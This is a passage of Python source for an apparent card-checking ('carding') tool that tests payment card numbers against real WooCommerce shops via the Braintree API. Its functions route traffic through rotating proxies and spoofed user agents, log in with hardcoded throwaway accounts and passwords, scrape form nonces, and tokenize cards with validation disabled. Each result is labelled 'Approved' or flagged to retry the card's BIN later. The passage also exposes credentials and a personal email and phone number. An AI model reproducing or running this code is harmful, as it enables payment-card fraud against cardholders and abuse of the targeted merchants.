        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'username': cookei,
        'password': 'Apdlla2006$$',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/my-account/',
        'login': 'Login',
        'rememberme': 'forever',
    }
    
    try:
        response = r.post('https://www.midwestspeakerrepair.com/my-account/', cookies=r.cookies, headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - login POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/edit-address/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        response = r.get(
            'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
            headers=headers,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - billing address GET: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    add = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'billing_first_name': 'Alix',
        'billing_last_name': 'Morning',
        'billing_company': 'Please',
        'billing_country': 'US',
        'billing_address_1': 'New York',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '15519828835',
        'billing_email': 'samysamyapdlla9@gmail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': add,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
            cookies=r.cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - edit address POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        response = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - add payment method GET (1): {e}")
        return "ERROR: Proxy/Connection Failed"
        
    client = re.search(r'"credit_card","client_token_nonce":"(.*?)",',response.text).group(1)
    
    non =re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)
    
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - ajax POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    tokn = response.json()['data']
    
    sin = str (base64.b64decode(tokn))
    
    auth = re.findall(r'authorizationFingerprint":"(.*?)"', sin)[0]
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': c,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=15)
        tok=(response.json()['data']['tokenizeCreditCard']['token'])
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - Braintree GraphQL POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    except KeyError:
        return "Declined - Tokenization Failed"
        
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'master-card'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '1.50'),
        ('wc_braintree_credit_card_payment_nonce', tok),
        ('wc_braintree_device_data', '{"correlation_id":"a7bcabfc8a4750ff7382ece51cff3cc7"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('wc_braintree_paypal_payment_nonce', ''),
        ('wc_braintree_device_data', '{"correlation_id":"a7bcabfc8a4750ff7382ece51cff3cc7"}'),
        ('wc-braintree-paypal-context', 'shortcode'),
        ('wc_braintree_paypal_amount', '1.50'),
        ('wc_braintree_paypal_currency', 'USD'),
        ('wc_braintree_paypal_locale', 'en_us'),
        ('wc-braintree-paypal-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', non),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]
    
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
            cookies=r.cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
        text = response.text
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele3 - final POST: {e}")
        return "ERROR: Proxy/Connection Failed"

    pattern = r'Status code (.*?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'added' in text or 'Payment method successfully added.' in text:
            result = "Approved ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'

    if 'risk_threshold' in result:
            return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
            return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in text:
            return 'Approved ✅'
    elif 'Duplicate card exists in the vault.' in result:
            return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
            return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
            return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
            return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
            return 'Approved ✅!'
    else:
        return result


def notauto(ccx):
    proxies = get_random_proxy_dict()
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
    print(c,mm,yy,cvc)
    user = user_agent.generate_user_agent()
    r=requests.session()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"

    try:
        open("cok.txt", "r")
    except:
        open("cok.txt", "w").close()

    with open("cok.txt", "r") as file:
        first_line = file.readline().strip()

    last_used_times = {}

    cookei = ""
    while True:
        lines = """aopzstu@hi2.in
xlwlwbrz@hi2.in
wkadykmy@hi2.in
fxfilzkg@hi2.in
ssyyxs@hi2.in
flyyzy@hi2.in
yztiktnu@hi2.in
tgvxjj@hi2.in
fprmgl@hi2.in
pjgnhskm@hi2.in
yorwbq@hi2.in
vyojxvn@hi2.in
kgofpm@hi2.in
akrvqub@hi2.in
oihiiyjx@hi2.in
itjyxf@hi2.in
sbwomimy@hi2.in
muoqi@hi2.in
qzykpe@hi2.in
edtenh@hi2.in
lkuctxq@hi2.in
nmdspv@hi2.in
vcpumxg@hi2.in
aiudqg@telegmail.com
fpubjn@telegmail.com
btlax@telegmail.com
xigdpidl@telegmail.com
idlslsf@telegmail.com
asozd@telegmail.com
ctxzf@hi2.in
habvt@telegmail.com
jbssxfk@telegmail.com
egfamht@hi2.in
bbqglo@hi2.in
kbjeata@hi2.in
ufwry@hi2.in
ilyifgz@hi2.in
uuxkrvob@hi2.in
ycojmc@hi2.in
rhbummaa@hi2.in"""
        lines = lines.strip().split("\n")
        random_line_number = random.randint(0, len(lines) - 1)
        temp_cookei = lines[random_line_number]

        current_time = time.time()

        if temp_cookei in last_used_times:
            time_since_last_use = current_time - last_used_times[temp_cookei]
            if time_since_last_use < 20:
                continue

        if temp_cookei == first_line:
            pass
        else:
            cookei = temp_cookei
            last_used_times[cookei] = current_time
            break

    with open("cok.txt", "w") as file:
        file.write(cookei)
        print(cookei)

    heaf = {
        'User-Agent': user,
    }
    
    try:
        get = r.get("https://ifeat.org/my-account/", headers=heaf, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - initial GET: {e}")
        return "ERROR: Proxy/Connection Failed"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }

    data = {
        'login_username': cookei,
        'login_password': '123bmS1234',
        'login_remember': 'true',
        'login_submit': 'Sign In',
        'login_redirect': 'https://ifeat.org/my-account/',
        'login_form_id': '3',
        'pp_current_url': 'https://ifeat.org/my-account/',
        'login_referrer_page': '',
    }

    try:
        response = r.post('https://ifeat.org/my-account/payment-methods/', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - login POST: {e}")
        return "ERROR: Proxy/Connection Failed"

    heaf = {
        'User-Agent': user,
    }
    try:
        rrr = r.get("https://ifeat.org/my-account/add-payment-method/", headers=heaf, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - add payment method GET (1): {e}")
        return "ERROR: Proxy/Connection Failed"

    nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
    client = re.search(r'client_token_nonce":"([^"]+)"', rrr.text).group(1)

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }

    try:
        response = r.post('https://ifeat.org/wp-admin/admin-ajax.php', headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - ajax POST: {e}")
        return "ERROR: Proxy/Connection Failed"

    enc = response.json()['data']
    dec = base64.b64decode(enc).decode('utf-8')
    auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {	 prepaid	 healthcare	 debit	 durbinRegulated	 commercial	 payroll	 issuingBank	 countryOfIssuance	 productId	   }	 }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': c,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=15)
        tok=(response.json()['data']['tokenizeCreditCard']['token'])
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - Braintree GraphQL POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    except KeyError:
        return "Declined - Tokenization Failed"
    
    headers = {
        'User-Agent': user,
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': tok,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    try:
        response = r.post('https://ifeat.org/my-account/add-payment-method/', headers=headers, data=data, proxies=proxies, timeout=15)
        text = response.text
    except requests.exceptions.RequestException as e:
        print(f"Error in notauto - final POST: {e}")
        return "ERROR: Proxy/Connection Failed"
		
    pattern = r'Reason: (.+?)\s*</li>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if 'added' in text or 'Payment method successfully added.' in text:
            result = "Approved ✅"
            return result
        else:
            try:
                result = text.split('Status code ')[1].split('<')[0]
            except:
                try:
                    result = match
                except:
                    result = 'Unknow Response'

    if 'risk_threshold' in result:
            return "RISK: Retry this BIN later."
    elif 'You cannot add a new payment method so soon after the previous one' in result:
            return "Please wait for 20 seconds."
    elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in text:
            return 'Approved ✅'
    elif 'Duplicate card exists in the vault.' in result:
            return 'Approved ✅! - Duplicate'
    elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
            return 'Approved ✅! - AVS-CVV'
    elif "Invalid postal code" in result or "CVV." in result:
            return 'Approved ✅! - Invalid postal code and cvv'
    elif "Card Issuer Declined CVV" in result:
            return 'Approved ✅! - Declined CVV'
    elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
            return 'Approved ✅!'
    else:
        return result


def Tele4(ccx):
    proxies = get_random_proxy_dict()
    ccx=ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    c = parts[0]
    mm = parts[1]
    ex = parts[2]
    cvc = parts[3]
    try:
        yy = ex[2] + ex[3]
        if '2' in ex[3] or '1' in ex[3]:
            yy = ex[2] + '7'
        else:
            pass
    except:
        yy = ex[0] + ex[1]
        if '2' in ex[1] or '1' in ex[1]:
            yy = ex[0] + '7'
        else:
            pass
            
    user = user_agent.generate_user_agent()
    r  = requests.session()
    characters = string.ascii_uppercase + string.digits
    postal_code = ''.join(random.choices(characters, k=6))
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    User  = f"{username}ooepr"
    em = f"{username}%40gmail.com"

    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        response = r.get('https://www.midwestspeakerrepair.com/my-account/', headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - initial GET: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    login = re.search(r'name="woocommerce-login-nonce" value="(.*?)"',response.text).group(1)
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'username': 'zalkmz@hi2.in',
        'password': 'Apdlla2006$$',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/my-account/',
        'login': 'Login',
        'rememberme': 'forever',
    }
    
    try:
        response = r.post('https://www.midwestspeakerrepair.com/my-account/', cookies=r.cookies, headers=headers, data=data, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - login POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/edit-address/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        response = r.get(
            'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
            headers=headers,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - billing address GET: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    add = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'billing_first_name': 'Alix',
        'billing_last_name': 'Morning',
        'billing_company': 'Please',
        'billing_country': 'US',
        'billing_address_1': 'New York',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '15519828835',
        'billing_email': 'samysamyapdlla9@gmail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': add,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }
    
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/my-account/edit-address/billing/',
            cookies=r.cookies,
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - edit address POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    try:
        response = r.get('https://www.midwestspeakerrepair.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, proxies=proxies, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - add payment method GET (1): {e}")
        return "ERROR: Proxy/Connection Failed"
        
    client = re.search(r'"credit_card","client_token_nonce":"(.*?)",',response.text).group(1)
    
    non =re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text).group(1)
    
    
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client,
    }
    try:
        response = r.post(
            'https://www.midwestspeakerrepair.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            proxies=proxies,
            timeout=15
        )
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - ajax POST: {e}")
        return "ERROR: Proxy/Connection Failed"
        
    tokn = response.json()['data']
    
    sin = str (base64.b64decode(tokn))
    
    auth = re.findall(r'authorizationFingerprint":"(.*?)"', sin)[0]
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'authorization': f'Bearer {auth}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': c,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxies, timeout=15)
        tok=(response.json()['data']['tokenizeCreditCard']['token'])
    except requests.exceptions.RequestException as e:
        print(f"Error in Tele4 (Charge) - Braintree GraphQL POST: {e}")
        return "ERROR: Proxy/Connection Failed"
    except KeyError:
        return "Declined - Tokenization Failed"
        
    headers = {
        'authority': 'www.midwestspeakerrepair.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,it;q=0.8,ar;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.midwestspeakerrepair.com',
        'referer': 'https://www.midwestspeakerrepair.com/my-account/add-payment-method/',
